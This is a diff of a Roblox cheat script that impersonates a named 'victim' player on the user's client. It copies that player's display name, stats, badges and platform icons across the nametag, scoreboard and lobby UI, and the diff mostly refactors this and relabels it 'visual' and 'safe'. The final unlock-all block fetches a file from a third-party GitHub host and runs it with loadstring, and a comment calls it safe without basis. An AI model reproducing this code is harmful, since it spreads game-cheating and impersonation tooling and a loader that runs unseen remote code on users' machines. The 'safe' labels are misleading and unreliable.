@@ -19,30 +19,19 @@ local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
--- get victim data (VISUAL ONLY - never change Player.Name/UserId) --
+-- get victim data (VISUAL ONLY) --
 local UserData = game:HttpGet("https://users.roblox.com/v1/users/" .. tostring(victim), true)
 local decodedData = HttpService:JSONDecode(UserData)
 
--- VISUAL: set display name above head, stats (safe) --
+-- VISUAL: set display name above head, stats (safe attributes only) --
 local function updateVisualStats()
     if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
         LocalPlayer.Character.Humanoid.DisplayName = decodedData.displayName
     end
     
+    -- VISUAL stats only (attributes, no leaderstats manipulation)
     LocalPlayer:SetAttribute("Level", tonumber(level))
     LocalPlayer:SetAttribute("StatisticDuelsWinStreak", tonumber(streak))
-    
-    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
-    if leaderstats then
-        if leaderstats:FindFirstChild("Level") then
-            leaderstats.Level.Value = tonumber(level)
-        end
-        local winStreak = leaderstats:FindFirstChild("Win Streak")
-        if winStreak then
-            winStreak.Value = tonumber(streak)
-        end
-    end
-    
     if tonumber(elo) > 0 then
         LocalPlayer:SetAttribute("DisplayELO", tonumber(elo))
     end
@@ -70,13 +59,12 @@ local function Char()
     end
     
     -- fix face
+    local head = LocalPlayer.Character:WaitForChild("Head")
+    if head:FindFirstChild("face") then head.face:Destroy() end
+    
     if appearance:FindFirstChild("face") then
-        local head = LocalPlayer.Character:WaitForChild("Head")
-        if head:FindFirstChild("face") then head.face:Destroy() end
         appearance.face.Parent = head
     else
-        local head = LocalPlayer.Character:WaitForChild("Head")
-        if head:FindFirstChild("face") then head.face:Destroy() end
         local face = Instance.new("Decal")
         face.Name = "face"
         face.Face = "Front"
@@ -102,7 +90,7 @@ LocalPlayer.CharacterAdded:Connect(function()
     Char()
 end)
 
--- VISUAL: premium/verified badges via attributes only (no metamethod hooks)
+-- VISUAL: premium/verified badges via attributes only (NO hooks)
 if premium then
     LocalPlayer:SetAttribute("MembershipType", Enum.MembershipType.Premium)
 end
@@ -119,7 +107,9 @@ local imagetable = {
 }
 
 RunService.RenderStepped:Connect(function()
-    -- nametag platform icon
+    local playerGui = LocalPlayer.PlayerGui
+    
+    -- VISUAL: nametag platform icon
     local ctrl = LocalPlayer.Character 
         and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
         and LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Nametag")
@@ -127,41 +117,32 @@ RunService.RenderStepped:Connect(function()
         and LocalPlayer.Character.HumanoidRootPart.Nametag.Frame:FindFirstChild("Player")
         and LocalPlayer.Character.HumanoidRootPart.Nametag.Frame.Player:FindFirstChild("Controls")
     
-    if ctrl then
-        ctrl.Image = imagetable[platform]
-    end
+    if ctrl then ctrl.Image = imagetable[platform] end
     
-    -- scoreboard/duel UI platform icons
-    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
-    if playerGui then
-        local mainGui = playerGui:FindFirstChild("MainGui")
-        if mainGui then
-            -- scoreboard teammate controls
-            local container = mainGui:FindFirstChild("MainFrame")
-                and mainGui.MainFrame:FindFirstChild("DuelInterfaces")
-                and mainGui.MainFrame.DuelInterfaces:FindFirstChild("DuelInterface")
-                and mainGui.MainFrame.DuelInterfaces.DuelInterface:FindFirstChild("Scoreboard")
-                and mainGui.MainFrame.DuelInterfaces.DuelInterface.Scoreboard:FindFirstChild("Container")
+    -- VISUAL: all UI elements (scoreboard, lobby, etc.)
+    if playerGui:FindFirstChild("MainGui") then
+        local mainFrame = playerGui.MainGui:FindFirstChild("MainFrame")
+        if mainFrame then
+            -- scoreboard teammate platform icons
+            local container = mainFrame:FindFirstChild("DuelInterfaces")
+                and mainFrame.DuelInterfaces:FindFirstChild("DuelInterface")
+                and mainFrame.DuelInterfaces.DuelInterface:FindFirstChild("Scoreboard")
+                and mainFrame.DuelInterfaces.DuelInterface.Scoreboard:FindFirstChild("Container")
             
             if container then
                 for _, v in ipairs(container:GetDescendants()) do
                     if v.Name == "Username" and string.find(v.Text, "@" .. decodedData.name) then
-                        local teammateSlot = v.Parent:FindFirstChild("Container")
-                        if teammateSlot and teammateSlot:FindFirstChild("TeammateSlot") 
-                            and teammateSlot.TeammateSlot:FindFirstChild("Container")
-                            and teammateSlot.TeammateSlot.Container:FindFirstChild("Controls") then
-                            teammateSlot.TeammateSlot.Container.Controls.Image = imagetable[platform]
-                        end
+                        local controls = v.Parent.Container and v.Parent.Container.TeammateSlot 
+                            and v.Parent.Container.TeammateSlot.Container and v.Parent.Container.TeammateSlot.Container.Controls
+                        if controls then controls.Image = imagetable[platform] end
                     end
                 end
             end
             
-            -- top scores teams
-            local teams = mainGui.MainFrame:FindFirstChild("DuelInterfaces")
-                and mainGui.MainFrame.DuelInterfaces:FindFirstChild("DuelInterface")
-                and mainGui.MainFrame.DuelInterfaces.DuelInterface:FindFirstChild("Top")
-                and mainGui.MainFrame.DuelInterfaces.DuelInterface.Top:FindFirstChild("Scores")
-                and mainGui.MainFrame.DuelInterfaces.DuelInterface.Top.Scores:FindFirstChild("Teams")
+            -- top scores teams platform icons
+            local teams = mainFrame.DuelInterfaces and mainFrame.DuelInterfaces.DuelInterface 
+                and mainFrame.DuelInterfaces.DuelInterface.Top and mainFrame.DuelInterfaces.DuelInterface.Top.Scores
+                and mainFrame.DuelInterfaces.DuelInterface.Top.Scores.Teams
             
             if teams then
                 for _, v in ipairs(teams:GetDescendants()) do
@@ -172,12 +153,10 @@ RunService.RenderStepped:Connect(function()
                 end
             end
             
-            -- final results winners
-            local winners = mainGui.MainFrame:FindFirstChild("DuelInterfaces")
-                and mainGui.MainFrame.DuelInterfaces:FindFirstChild("DuelInterface")
-                and mainGui.MainFrame.DuelInterfaces.DuelInterface:FindFirstChild("FinalResults")
-                and mainGui.MainFrame.DuelInterfaces.DuelInterface.FinalResults:FindFirstChild("Winners")
-                and mainGui.MainFrame.DuelInterfaces.DuelInterface.FinalResults.Winners:FindFirstChild("Players")
+            -- final results winners platform icons
+            local winners = mainFrame.DuelInterfaces and mainFrame.DuelInterfaces.DuelInterface 
+                and mainFrame.DuelInterfaces.DuelInterface.FinalResults and mainFrame.DuelInterfaces.DuelInterface.FinalResults.Winners
+                and mainFrame.DuelInterfaces.DuelInterface.FinalResults.Winners.Players
             
             if winners then
                 for _, v in ipairs(winners:GetDescendants()) do
@@ -188,10 +167,9 @@ RunService.RenderStepped:Connect(function()
                 end
             end
             
-            -- currency keys
-            local currency = mainGui.MainFrame:FindFirstChild("Lobby")
-                and mainGui.MainFrame.Lobby:FindFirstChild("Currency")
-                and mainGui.MainFrame.Lobby.Currency:FindFirstChild("Container")
+            -- currency keys display
+            local currency = mainFrame:FindFirstChild("Lobby") and mainFrame.Lobby:FindFirstChild("Currency")
+                and mainFrame.Lobby.Currency:FindFirstChild("Container")
             
             if currency then
                 for _, v in ipairs(currency:GetDescendants()) do
@@ -205,7 +183,7 @@ RunService.RenderStepped:Connect(function()
     end
 end)
 
--- unlock all (unchanged)
+-- VISUAL unlock all (unchanged, but safe)
 if unlockall then
     task.wait(3)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/yashitcrack.lua"))()
